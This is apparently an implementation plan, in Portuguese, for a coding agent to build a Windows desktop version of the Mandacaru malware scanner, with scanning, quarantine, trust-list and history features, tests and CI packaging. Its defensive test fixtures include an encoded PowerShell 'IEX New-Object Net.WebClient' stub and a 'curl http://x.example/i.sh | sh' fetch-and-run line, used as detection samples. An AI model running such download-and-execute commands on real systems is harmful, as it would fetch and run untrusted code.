# Mandacaru para Windows — plano de implementação

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Pacote `mandacaru-windows` com janela PySide6 que varre pastas sob demanda usando o núcleo do Mandacaru e deixa a pessoa decidir cada achado (Abrir local / Ignorar sempre / Quarentena), mais instalador por usuário.

**Architecture:** Tudo novo em `windows/` e `.github/workflows/windows.yml`. Uma camada pura em Python (`scan.py`, `store.py`, `quarantine.py`) testável sem Qt, e uma camada Qt fina (`worker.py`, `app.py`) por cima. O núcleo entra só via `mandacaru.detectors.static.StaticScanner`, `mandacaru.events` e `mandacaru.ml.load_default`.

**Tech Stack:** Python 3.13 (build), PySide6 ≥ 6.6, yara-python (do núcleo), pytest, PyInstaller ≥ 6.10 (onedir), Inno Setup 6, GitHub Actions `windows-latest`.

**Spec:** `docs/superpowers/specs/2026-11-21-versao-windows-design.md`

## Global Constraints

- Não alterar nada em `src/mandacaru/`, `packaging/`, `tests/`, `pyproject.toml` da raiz nem em `ci.yml`/`deb.yml`/`release.yml`.
- Nunca importar `mandacaru.cli`, `mandacaru.quarantine`, `mandacaru.quarantine_cli`, `mandacaru.decisions`, `mandacaru.alert_socket` (dependem de `grp`/`pwd`/`fcntl`/`AF_UNIX`).
- Build com **Python 3.13** (yara-python não tem wheel `win_amd64` para 3.14). Código compatível com `>=3.10`.
- Sem administrador: instalação em `{localappdata}\Programs\Mandacaru`, `PrivilegesRequired=lowest`.
- Dados do usuário em `%LOCALAPPDATA%\Mandacaru\` (`trust.json`, `history.jsonl`, `quarantine\`).
- Nada é movido ou apagado sem clique; a varredura nunca roda na thread da interface.
- Achados `INFO` não aparecem; `LOW` em diante sim. Uma linha por arquivo, com a pior severidade.
- Interface em português do Brasil.
- Commits sem linha `Co-Authored-By` (preferência do dono do repositório; único autor VandyckLN). Trabalhar no branch `feat/windows`, nunca direto em `main`.
- Testes rodam com `cd windows && ../.venv/bin/python -m pytest` (venv da raiz, com `pip install -e ./windows` antes). Testes Qt usam `QT_QPA_PLATFORM=offscreen` e `pytest.importorskip("PySide6")`.

## Review Focus

1. **Build congelado sem as regras YARA** (PyInstaller sem `collect_data_files("mandacaru")`): o `.exe` tem que achar as regras. Coberto por `--selftest` no Task 6, rodado no CI sobre o `.exe` gerado.
2. **`trust.json` corrompido ou `history.jsonl` com linha quebrada**: o app abre, começa com lista vazia e não perde o arquivo (renomeia para `.corrompido`). Teste no Task 2.
3. **Arquivo some ou fica travado entre o achado e o clique** (Defender removeu, pessoa apagou): Quarentena/Ignorar mostram erro e nada fica pela metade. Teste no Task 3 e no Task 4.
4. **Nomes com acento e espaço** (`relatório final.ps1`): achado, quarentena e restauração funcionam. Teste no Task 3.
5. **Alvo que é um arquivo solto, caminho inexistente ou pastas sobrepostas** (Downloads + a pasta pai): varre o arquivo, ignora o inexistente, não varre nada duas vezes. Teste no Task 1.

---

### Task 1: Pacote e núcleo da varredura (`scan.py`)

**Files:**
- Create: `windows/pyproject.toml`
- Create: `windows/src/mandacaru_win/__init__.py`
- Create: `windows/src/mandacaru_win/scan.py`
- Test: `windows/tests/test_scan.py`, `windows/tests/test_version.py`

**Interfaces:**
- Produces:
  - `mandacaru_win.__version__: str` (`"0.5.0"`, igual a `mandacaru.__version__`)
  - `@dataclass class Finding: path: Path; sha256: str; severity: Severity; alerts: list[Alert]`
  - `@dataclass class ScanSummary: started: float; paths: list[str]; files: int; findings: int; duration: float; completed: bool`
  - `make_scanner() -> StaticScanner` — `StaticScanner(classifier=ml.load_default("alert").classifier)`
  - `sha256_file(path: Path) -> str` — leitura em blocos de 1 MiB
  - `is_cloud_only(st: os.stat_result) -> bool`
  - `list_files(paths: list[Path], scanner: StaticScanner) -> list[Path]`
  - `scan_paths(paths, scanner, trusted: set[str], on_progress: Callable[[Path, int, int], None], on_finding: Callable[[Finding], None], should_stop: Callable[[], bool]) -> ScanSummary`

- [ ] **Step 1: Criar branch** — `git switch -c feat/windows`

- [ ] **Step 2: `windows/pyproject.toml`**

`[project] name = "mandacaru-windows"`, `version = "0.5.0"`, `requires-python = ">=3.10"`, `license = { text = "GPL-3.0-or-later" }`, `dependencies = ["mandacaru-edr", "PySide6>=6.6"]`, `optional-dependencies.dev = ["pytest>=8", "pyinstaller>=6.10"]`, `[project.gui-scripts] mandacaru-win = "mandacaru_win.__main__:main"`, `[tool.setuptools.packages.find] where = ["src"]`, `[tool.pytest.ini_options] pythonpath = ["src"]`, `testpaths = ["tests"]`, marker `windows: só roda no Windows`. Instalar: `.venv/bin/pip install -e ./windows`.

- [ ] **Step 3: Escrever os testes que falham**

`windows/tests/conftest.py` com fixtures `scanner` (`make_scanner()`, escopo de sessão) e `ps_text` (`"powershell.exe -NoP -enc " + "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi" + "\n"`, o mesmo texto de `tests/test_detectors.py::test_powershell_encoded`; não usar EICAR, o Defender do runner apaga). Em `test_scan.py`, um helper `run(paths, scanner, trusted=set(), stop_after=None)` que chama `scan_paths` e devolve `(summary, findings, progress_calls)`.

```python
def test_version_matches_core():
    import mandacaru, mandacaru_win
    assert mandacaru_win.__version__ == mandacaru.__version__

def test_finding_grouped_per_file(tmp_path, scanner, ps_text):
    (tmp_path / "a.ps1").write_text(ps_text + "curl http://x.example/i.sh | sh\n")
    (tmp_path / "ok.txt").write_text("nada aqui")
    summary, findings, _ = run([tmp_path], scanner)
    assert [f.path.name for f in findings] == ["a.ps1"]
    assert len(findings[0].alerts) >= 2 and findings[0].severity == Severity.HIGH
    assert findings[0].sha256 == sha256_file(tmp_path / "a.ps1")
    assert summary.files == 2 and summary.findings == 1 and summary.completed

def test_trusted_hash_is_skipped(tmp_path, scanner, ps_text):
    f = tmp_path / "a.ps1"; f.write_text(ps_text)
    _, findings, _ = run([tmp_path], scanner, trusted={sha256_file(f)})
    assert findings == []

def test_stop_interrupts(tmp_path, scanner):
    for i in range(5): (tmp_path / f"{i}.txt").write_text("x")
    summary, _, _ = run([tmp_path], scanner, stop_after=2)
    assert not summary.completed and summary.files == 2

def test_progress_reports_total(tmp_path, scanner):
    for i in range(3): (tmp_path / f"{i}.txt").write_text("x")
    _, _, calls = run([tmp_path], scanner)
    assert [(d, t) for _, d, t in calls] == [(1, 3), (2, 3), (3, 3)]

def test_skips_dev_dirs_and_dir_symlinks(tmp_path, scanner, ps_text):
    (tmp_path / ".git").mkdir(); (tmp_path / ".git" / "a.ps1").write_text(ps_text)
    outside = tmp_path.parent / (tmp_path.name + "_fora"); outside.mkdir(); (outside / "b.ps1").write_text(ps_text)
    (tmp_path / "link").symlink_to(outside, target_is_directory=True)
    assert list_files([tmp_path], scanner) == []

def test_single_file_missing_path_and_overlap(tmp_path, scanner, ps_text):
    sub = tmp_path / "sub"; sub.mkdir(); f = sub / "a.ps1"; f.write_text(ps_text)
    files = list_files([sub, tmp_path, f, tmp_path / "nao-existe"], scanner)
    assert files == [f]

def test_cloud_only_attributes():
    class St: st_file_attributes = 0x00400000   # FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS
    assert is_cloud_only(St())
    St.st_file_attributes = 0x20                 # ARCHIVE
    assert not is_cloud_only(St())
```

- [ ] **Step 4: Rodar e ver falhar** — `cd windows && ../.venv/bin/python -m pytest -q` → FAIL (`ModuleNotFoundError: mandacaru_win.scan`)

- [ ] **Step 5: Implementar `scan.py` e `__init__.py`**

- `__init__.py`: cabeçalho GPL igual ao de `src/mandacaru/__init__.py` e `__version__ = "0.5.0"`.
- `SKIP_DIRS = {".git", "node_modules", "__pycache__", ".venv"}`; `CLOUD_ATTRS = 0x00400000 | 0x00040000 | 0x00001000` (RECALL_ON_DATA_ACCESS, RECALL_ON_OPEN, OFFLINE); `is_cloud_only` usa `getattr(st, "st_file_attributes", 0)`.
- `list_files`: para cada alvo, `Path(os.path.abspath(p))`; arquivo vira ele mesmo; pasta via `os.walk(followlinks=False)`, filtrando `dirnames` por `SKIP_DIRS`, `scanner.is_excluded`, `os.path.islink` e `os.path.isjunction` (usar `getattr(os.path, "isjunction", lambda _: False)` para 3.10/3.11); pula arquivo com `is_cloud_only(os.stat(...))` (OSError → pula). Deduplica preservando a ordem (`dict.fromkeys`).
- `scan_paths`: `files = list_files(...)`; para cada arquivo, `should_stop()` antes; `alerts = [a for a in scanner.scan_file(f) if a.severity > Severity.INFO]`; `on_progress(f, i, total)`; se houver alertas, calcula `sha256_file` (OSError → descarta o achado), pula se estiver em `trusted`, senão `on_finding(Finding(f, h, max(a.severity for a in alerts), alerts))`. `files` no resumo = arquivos efetivamente varridos.

- [ ] **Step 6: Rodar e ver passar** — `cd windows && ../.venv/bin/python -m pytest -q` → todos PASS

- [ ] **Step 7: Commit**

```bash
git add windows/
git commit -m "feat(windows): pacote mandacaru-windows e varredura com progresso"
```

---

### Task 2: Dados do usuário (`store.py`)

**Files:**
- Create: `windows/src/mandacaru_win/store.py`
- Test: `windows/tests/test_store.py`

**Interfaces:**
- Consumes: `ScanSummary` (Task 1)
- Produces:
  - `data_dir() -> Path` — `Path(os.environ.get("LOCALAPPDATA") or Path.home() / ".local" / "share") / "Mandacaru"`, criada se faltar
  - `class TrustList: __init__(path: Path)`, `hashes() -> set[str]`, `entries() -> list[dict]` (chaves `sha256`, `caminho_quando_confiado`, `data`), `add(sha256: str, path: Path) -> None`, `remove(sha256: str) -> None`
  - `class History: __init__(path: Path)`, `append(summary: ScanSummary) -> None`, `recent(n: int = 50) -> list[dict]` (mais recente primeiro)

- [ ] **Step 1: Escrever os testes que falham**

```python
def test_trust_add_remove_persists(tmp_path):
    t = TrustList(tmp_path / "trust.json"); t.add("ab" * 32, Path("C:/x/a.ps1"))
    assert TrustList(tmp_path / "trust.json").hashes() == {"ab" * 32}
    t.add("ab" * 32, Path("C:/x/a.ps1"))                    # repetido não duplica
    assert len(t.entries()) == 1
    t.remove("ab" * 32)
    assert TrustList(tmp_path / "trust.json").hashes() == set()

def test_corrupt_trust_starts_empty_and_keeps_file(tmp_path):
    p = tmp_path / "trust.json"; p.write_text("{quebrado")
    assert TrustList(p).hashes() == set()
    assert (tmp_path / "trust.json.corrompido").read_text() == "{quebrado"

def test_history_recent_order_limit_and_bad_line(tmp_path):
    h = History(tmp_path / "history.jsonl")
    for i in range(3):
        h.append(ScanSummary(started=float(i), paths=["C:/d"], files=i, findings=0, duration=1.0, completed=True))
    with open(tmp_path / "history.jsonl", "a") as fh: fh.write("lixo\n")
    assert [r["started"] for r in h.recent(2)] == [2.0, 1.0]
```

- [ ] **Step 2: Rodar e ver falhar** — `../.venv/bin/python -m pytest tests/test_store.py -q` → FAIL

- [ ] **Step 3: Implementar `store.py`** — `TrustList` grava atômico (`tmp` + `os.replace`), UTF-8; JSON inválido → `os.replace` para `trust.json.corrompido` e começa vazio. `History.append` grava `dataclasses.asdict(summary)` em uma linha; `recent` ignora linhas que não são JSON.

- [ ] **Step 4: Rodar e ver passar** — `../.venv/bin/python -m pytest -q` → PASS

- [ ] **Step 5: Commit** — `git add windows/ && git commit -m "feat(windows): lista de confianca e historico"`

---

### Task 3: Quarentena (`quarantine.py`)

**Files:**
- Create: `windows/src/mandacaru_win/quarantine.py`
- Test: `windows/tests/test_quarantine.py`

**Interfaces:**
- Consumes: `Finding`, `sha256_file` (Task 1)
- Produces:
  - `class QuarantineError(Exception)` — mensagem em português, pronta para mostrar
  - `class Quarantine: __init__(base: Path)`, `add(finding: Finding) -> str` (id = `uuid4().hex`), `items() -> list[dict]` (chaves `id`, `caminho_original`, `sha256`, `data`, `regras: list[str]`, `severidade: str`; mais recente primeiro), `restore(qid: str) -> Path`, `delete(qid: str) -> None`

- [ ] **Step 1: Escrever os testes que falham**

Helper `finding_for(path)` monta `Finding(path, sha256_file(path), Severity.HIGH, [Alert("yara.X", Severity.HIGH, "s")])`.

```python
def test_roundtrip_preserves_bytes_and_removes_original(tmp_path):
    f = tmp_path / "relatório final.ps1"; data = b"\x00MZ" + os.urandom(1000); f.write_bytes(data)
    q = Quarantine(tmp_path / "q"); qid = q.add(finding_for(f))
    assert not f.exists()
    assert data not in (tmp_path / "q" / f"{qid}.bin").read_bytes()       # embaralhado
    assert q.items()[0]["caminho_original"] == str(f)
    assert q.restore(qid) == f and f.read_bytes() == data
    assert q.items() == [] and list((tmp_path / "q").iterdir()) == []

def test_failed_delete_keeps_original_and_cleans_quarantine(tmp_path, monkeypatch):
    f = tmp_path / "a.ps1"; f.write_bytes(b"abc")
    q = Quarantine(tmp_path / "q")
    monkeypatch.setattr(os, "remove", lambda *_: (_ for _ in ()).throw(PermissionError("em uso")))
    with pytest.raises(QuarantineError): q.add(finding_for(f))
    assert f.read_bytes() == b"abc" and list((tmp_path / "q").iterdir()) == []

def test_changed_or_missing_file_is_refused(tmp_path):
    f = tmp_path / "a.ps1"; f.write_bytes(b"abc"); fin = finding_for(f)
    f.write_bytes(b"mudou")
    with pytest.raises(QuarantineError): Quarantine(tmp_path / "q").add(fin)
    f.unlink()
    with pytest.raises(QuarantineError): Quarantine(tmp_path / "q").add(fin)

def test_restore_when_name_taken(tmp_path):
    f = tmp_path / "a.ps1"; f.write_bytes(b"abc")
    q = Quarantine(tmp_path / "q"); qid = q.add(finding_for(f))
    f.write_bytes(b"outro")
    assert q.restore(qid) == tmp_path / "a (restaurado).ps1"
    assert f.read_bytes() == b"outro"

def test_tampered_bin_is_not_restored(tmp_path):
    f = tmp_path / "a.ps1"; f.write_bytes(b"abc")
    q = Quarantine(tmp_path / "q"); qid = q.add(finding_for(f))
    (tmp_path / "q" / f"{qid}.bin").write_bytes(b"zzz")
    with pytest.raises(QuarantineError): q.restore(qid)
    assert not f.exists() and len(q.items()) == 1

def test_delete(tmp_path):
    f = tmp_path / "a.ps1"; f.write_bytes(b"abc")
    q = Quarantine(tmp_path / "q"); q.delete(q.add(finding_for(f)))
    assert q.items() == []
```

- [ ] **Step 2: Rodar e ver falhar** — `../.venv/bin/python -m pytest tests/test_quarantine.py -q` → FAIL

- [ ] **Step 3: Implementar `quarantine.py`**

- `KEY = b"mandacaru-quarentena"`; embaralhar = XOR byte a byte com a chave repetida (simétrico).
- `add`: lê o original inteiro (OSError → `QuarantineError("Não foi possível ler ...")`); se `sha256` difere de `finding.sha256` → `QuarantineError("O arquivo mudou desde a varredura; varra de novo.")`; grava `<id>.bin`, relê e confere; grava `<id>.json` (UTF-8, `ensure_ascii=False`); `os.remove(original)`; se falhar, remove `.bin`/`.json` e levanta `QuarantineError("O arquivo está em uso; feche o programa que o usa e tente de novo.")`.
- `restore`: desembaralha, confere sha256 (diferente → `QuarantineError`, nada muda); destino = original, ou `stem + " (restaurado)" + suffix` se existir (e `" (restaurado 2)"`… se também existir); `mkdir(parents=True, exist_ok=True)` na pasta; grava com `open(dest, "xb")`; só então apaga `.bin`/`.json`.
- `items`: lê todos os `.json`; um `.json` ilegível é ignorado.

- [ ] **Step 4: Rodar e ver passar** — `../.venv/bin/python -m pytest -q` → PASS

- [ ] **Step 5: Commit** — `git add windows/ && git commit -m "feat(windows): quarentena com restauracao conferida por hash"`

---

### Task 4: Janela e varredura em segundo plano (`worker.py`, `app.py`, `__main__.py`)

**Files:**
- Create: `windows/src/mandacaru_win/worker.py`
- Create: `windows/src/mandacaru_win/app.py`
- Create: `windows/src/mandacaru_win/__main__.py`
- Test: `windows/tests/test_app.py`

**Interfaces:**
- Consumes: `make_scanner`, `scan_paths`, `Finding`, `ScanSummary` (Task 1); `data_dir`, `TrustList`, `History` (Task 2); `Quarantine`, `QuarantineError` (Task 3)
- Produces:
  - `class ScanThread(QThread)`: `__init__(paths: list[Path], scanner, trusted: set[str])`; sinais `progress = Signal(object, int, int)`, `found = Signal(object)`, `done = Signal(object)`; `stop() -> None`
  - `class MainWindow(QMainWindow)`: `__init__(data: Path, scanner=None)` (`None` → `make_scanner()`); atributos substituíveis em teste `confirm: Callable[[str], bool]` e `notify: Callable[[str], None]` (padrão: `QMessageBox`); `findings: dict[Path, Finding]`; sinal `scan_finished = Signal(object)`; métodos `start_scan(paths: list[Path])`, `stop_scan()`, `open_location(path: Path)`, `ignore_finding(path: Path)`, `quarantine_finding(path: Path)`
  - `main() -> int` em `__main__.py` (imports absolutos `from mandacaru_win.app import ...`, por causa do PyInstaller)

- [ ] **Step 1: Escrever os testes que falham**

Fixture `app` cria `QApplication` uma vez com `QT_QPA_PLATFORM=offscreen` (via `os.environ.setdefault` no `conftest.py`, antes de importar PySide6); helper `wait_scan(win, paths)` conecta `scan_finished` a um `QEventLoop.quit`, chama `start_scan`, roda o loop com `QTimer.singleShot(10000, loop.quit)` de segurança e devolve o `ScanSummary`. Helper `make_win(tmp_path, scanner)` cria `MainWindow(tmp_path / "dados", scanner)` com `confirm = lambda _: True` e `notify = win.msgs.append` (`win.msgs = []`), para nenhum `QMessageBox` bloquear o teste.

```python
pytest.importorskip("PySide6")

def test_window_scans_and_lists_finding(app, tmp_path, scanner, ps_text):
    d = tmp_path / "alvo"; d.mkdir(); (d / "a.ps1").write_text(ps_text)
    win = make_win(tmp_path, scanner)
    summary = wait_scan(win, [d])
    assert summary.completed and list(win.findings) == [d / "a.ps1"]
    assert History(tmp_path / "dados" / "history.jsonl").recent()[0]["findings"] == 1

def test_ignore_removes_row_and_trusts_hash(app, tmp_path, scanner, ps_text):
    d = tmp_path / "alvo"; d.mkdir(); f = d / "a.ps1"; f.write_text(ps_text)
    win = make_win(tmp_path, scanner); wait_scan(win, [d])
    win.ignore_finding(f)
    assert win.findings == {} and sha256_file(f) in TrustList(tmp_path / "dados" / "trust.json").hashes()
    assert wait_scan(win, [d]).findings == 0

def test_quarantine_from_list_and_error_on_vanished_file(app, tmp_path, scanner, ps_text):
    d = tmp_path / "alvo"; d.mkdir(); f = d / "a.ps1"; f.write_text(ps_text); g = d / "b.ps1"; g.write_text(ps_text)
    win = make_win(tmp_path, scanner)
    wait_scan(win, [d])
    win.quarantine_finding(f)
    assert not f.exists() and f not in win.findings
    g.unlink(); win.quarantine_finding(g)
    assert win.msgs and g in win.findings                  # erro mostrado, linha continua
```

- [ ] **Step 2: Rodar e ver falhar** — `../.venv/bin/python -m pytest tests/test_app.py -q` → FAIL (ou SKIP se PySide6 não carregar no ambiente; nesse caso instalar as libs do sistema que o erro de import pedir antes de seguir)

- [ ] **Step 3: Implementar `worker.py`** — `run()` chama `scan_paths` com callbacks que emitem os sinais e `should_stop=lambda: self._stop`; `stop()` liga a flag.

- [ ] **Step 4: Implementar `app.py` (aba Varredura) e `__main__.py`**

- Linha de botões: **Downloads** e **Área de Trabalho** (`QStandardPaths.writableLocation(DownloadLocation / DesktopLocation)`), **Pasta…** (`QFileDialog.getExistingDirectory`), **Parar** (habilitado só durante a varredura; os de iniciar desabilitados durante).
- `setAcceptDrops(True)`; `dropEvent` chama `start_scan` com os caminhos locais das URLs soltas (ignorado se já estiver varrendo).
- Progresso: `QProgressBar` (0..total), rótulo com o arquivo atual (elidido no meio), rótulo `"{n} arquivos · {k} achados"`.
- Lista: `QTreeWidget` com colunas Severidade, Arquivo, Motivo; filhos da linha = um por alerta (`summary` + `mitre`); ordenada por severidade decrescente; cor por severidade (escolha do implementador). Os três botões por linha via `setItemWidget` numa coluna Ações.
- `open_location`: no Windows `subprocess.Popen(f'explorer /select,"{path}"')` (string, não lista: o explorer precisa das aspas depois da vírgula; `"` não existe em caminho Windows); fora do Windows `QDesktopServices.openUrl` da pasta pai.
- `ignore_finding`: `TrustList.add(finding.sha256, path)`, remove a linha.
- `quarantine_finding`: `confirm("Mover para a quarentena?\n{path}")`; `Quarantine.add`; `QuarantineError` → `notify(str(exc))` e a linha fica.
- Ao terminar: `History.append(summary)`, emite `scan_finished`, status "Concluída" ou "Interrompida".
- Caminhos dentro de `data`: `trust.json`, `history.jsonl`, `quarantine/` (os testes contam com esses nomes).
- `main()`: `QApplication`, título "Mandacaru", `MainWindow(data_dir()).show()`, `app.exec()`. (O `--selftest` entra no Task 6.)

- [ ] **Step 5: Rodar e ver passar** — `../.venv/bin/python -m pytest -q` → PASS

- [ ] **Step 6: Olhar a janela** — `../.venv/bin/python -m mandacaru_win` (WSLg mostra a janela), varrer uma pasta com o `.ps1` de teste e conferir esboço do spec.

- [ ] **Step 7: Commit** — `git add windows/ && git commit -m "feat(windows): janela com varredura em segundo plano e acoes por achado"`

---

### Task 5: Abas Quarentena, Confiáveis e Histórico

**Files:**
- Modify: `windows/src/mandacaru_win/app.py`
- Test: `windows/tests/test_app.py`

**Interfaces:**
- Consumes: `Quarantine.items/restore/delete`, `TrustList.entries/remove`, `History.recent` (Tasks 2–3); `MainWindow` (Task 4)
- Produces: `MainWindow.restore_item(qid: str)`, `MainWindow.delete_item(qid: str)`, `MainWindow.remove_trusted(sha256: str)`, `MainWindow.refresh_tabs()`

- [ ] **Step 1: Escrever os testes que falham**

```python
def test_restore_and_delete_from_quarantine_tab(app, tmp_path, scanner, ps_text):
    d = tmp_path / "alvo"; d.mkdir(); f = d / "a.ps1"; f.write_text(ps_text); g = d / "b.ps1"; g.write_text(ps_text)
    win = make_win(tmp_path, scanner)
    wait_scan(win, [d]); win.quarantine_finding(f); win.quarantine_finding(g)
    q = Quarantine(tmp_path / "dados" / "quarantine"); ids = {i["caminho_original"]: i["id"] for i in q.items()}
    win.restore_item(ids[str(f)]); assert f.read_text() == ps_text
    win.delete_item(ids[str(g)]); assert q.items() == [] and not g.exists()

def test_declined_confirmation_changes_nothing(app, tmp_path, scanner, ps_text):
    d = tmp_path / "alvo"; d.mkdir(); f = d / "a.ps1"; f.write_text(ps_text)
    win = make_win(tmp_path, scanner); win.confirm = lambda _: False
    wait_scan(win, [d]); win.quarantine_finding(f)
    assert f.exists() and f in win.findings

def test_remove_trusted_lets_finding_return(app, tmp_path, scanner, ps_text):
    d = tmp_path / "alvo"; d.mkdir(); f = d / "a.ps1"; f.write_text(ps_text)
    win = make_win(tmp_path, scanner); wait_scan(win, [d]); h = win.findings[f].sha256
    win.ignore_finding(f); win.remove_trusted(h)
    assert wait_scan(win, [d]).findings == 1
```

- [ ] **Step 2: Rodar e ver falhar** — `../.venv/bin/python -m pytest tests/test_app.py -q` → FAIL

- [ ] **Step 3: Implementar as abas** — `QTabWidget` com Varredura · Quarentena · Confiáveis · Histórico.
  - Quarentena: tabela (data, caminho original, severidade, regras) com **Restaurar** (`confirm("Este arquivo foi marcado como suspeito. Restaurar mesmo assim?")`) e **Apagar** (`confirm("Apagar definitivamente?")`); `QuarantineError` → `notify`.
  - Confiáveis: tabela (caminho quando confiado, data, sha256 curto) com **Remover**.
  - Histórico: tabela das últimas 50 (data local, pastas, arquivos, achados, duração, Concluída/Interrompida).
  - `refresh_tabs()` chamado depois de cada ação e de cada varredura.

- [ ] **Step 4: Rodar e ver passar** — `../.venv/bin/python -m pytest -q` → PASS

- [ ] **Step 5: Commit** — `git add windows/ && git commit -m "feat(windows): abas de quarentena, confiaveis e historico"`

---

### Task 6: Empacotamento, autoteste e CI

**Files:**
- Modify: `windows/src/mandacaru_win/__main__.py` (opção `--selftest`)
- Create: `windows/mandacaru-win.spec`
- Create: `windows/installer.iss`
- Create: `.github/workflows/windows.yml`
- Create: `windows/README.md` (como montar e instalar, em pt-BR, curto)
- Test: `windows/tests/test_selftest.py`

**Interfaces:**
- Consumes: `make_scanner`, `scan_paths` (Task 1)
- Produces: `selftest() -> int` em `__main__.py` (0 = regras carregadas e o texto PowerShell de teste detectado; 1 = falhou); `main()` chama `selftest()` quando `"--selftest" in sys.argv`, sem abrir janela.

- [ ] **Step 1: Escrever o teste que falha**

```python
def test_selftest_passes():
    from mandacaru_win.__main__ import selftest
    assert selftest() == 0
```

- [ ] **Step 2: Rodar e ver falhar** — `../.venv/bin/python -m pytest tests/test_selftest.py -q` → FAIL

- [ ] **Step 3: Implementar `selftest()`** — grava o texto PowerShell do conftest num `tempfile.TemporaryDirectory()`, roda `scan_paths` e devolve 0 se houver um achado `HIGH`. Grava o resultado também em `%TEMP%\mandacaru-selftest.txt` (com `console=False` não há stdout).

- [ ] **Step 4: Rodar e ver passar** — `../.venv/bin/python -m pytest -q` → PASS

- [ ] **Step 5: `mandacaru-win.spec`**

`Analysis(["src/mandacaru_win/__main__.py"], datas=collect_data_files("mandacaru"), excludes=["psutil", "watchdog", "tkinter"])`; `EXE(..., name="Mandacaru", console=False)`; `COLLECT(..., name="Mandacaru")` (onedir).

- [ ] **Step 6: `installer.iss`**

`AppId` fixo (gerar um GUID uma vez), `AppName=Mandacaru`, `AppVersion={#MyAppVersion}` (passado por `/DMyAppVersion=`), `PrivilegesRequired=lowest`, `DefaultDirName={localappdata}\Programs\Mandacaru`, `DisableProgramGroupPage=yes`, `OutputBaseFilename=Mandacaru-{#MyAppVersion}-setup`, `LicenseFile=..\LICENSE`, `[Files]` copia `dist\Mandacaru\*` recursivo, `[Icons]` atalho em `{userprograms}\Mandacaru`, `[Run]` opção de abrir ao final, `[Languages]` `BrazilianPortuguese`. Desinstalar não apaga `%LOCALAPPDATA%\Mandacaru` (dados do usuário).

- [ ] **Step 7: `.github/workflows/windows.yml`**

- `on`: `pull_request` e `push` em `main` com `paths: ["windows/**", "src/mandacaru/**", ".github/workflows/windows.yml"]`; `push` em `tags: ["v*"]`. `permissions: contents: read`.
- Job `build` (`windows-latest`, Python `3.13`): `pip install . "./windows[dev]"`; `cd windows; python -m pytest -q`; checar `v{versão}` = `$GITHUB_REF_NAME` só em tag (mesma checagem do `release.yml`); `pyinstaller mandacaru-win.spec`; autoteste do congelado: `Start-Process dist\Mandacaru\Mandacaru.exe -ArgumentList --selftest -Wait -PassThru` e falhar se `ExitCode -ne 0`; `iscc /DMyAppVersion=$version installer.iss`; `upload-artifact` do `Output\*.exe` (`if-no-files-found: error`).
- Job `release` (só em tag; `needs: build`; `permissions: contents: write`): baixa o artefato; espera o release criado pelo `release.yml` (`gh release view $GITHUB_REF_NAME`, até 60 tentativas de 30 s); `gh release upload $GITHUB_REF_NAME *.exe --clobber`.

- [ ] **Step 8: Validar o YAML localmente** — `.venv/bin/python -c "import yaml,sys; yaml.safe_load(open('.github/workflows/windows.yml'))"` → sem erro (se `yaml` não estiver instalado, `pip install pyyaml` só no venv).

- [ ] **Step 9: Commit** — `git add windows/ .github/workflows/windows.yml && git commit -m "build(windows): PyInstaller, instalador Inno Setup e workflow"`

- [ ] **Step 10: Conferir no CI** — push do branch e PR; o job `build` do `windows.yml` tem que passar, com autoteste do `.exe` e artefato `Mandacaru-0.5.0-setup.exe`. Confirmar que `git diff main --stat` não lista nada fora de `windows/` e `.github/workflows/windows.yml`.

- [ ] **Step 11: Teste manual no Windows** — baixar o artefato, instalar sem admin, abrir pelo Menu Iniciar, varrer Downloads, arrastar uma pasta com o `.ps1` de teste, colocar em quarentena, restaurar, ignorar, conferir Histórico; desinstalar.
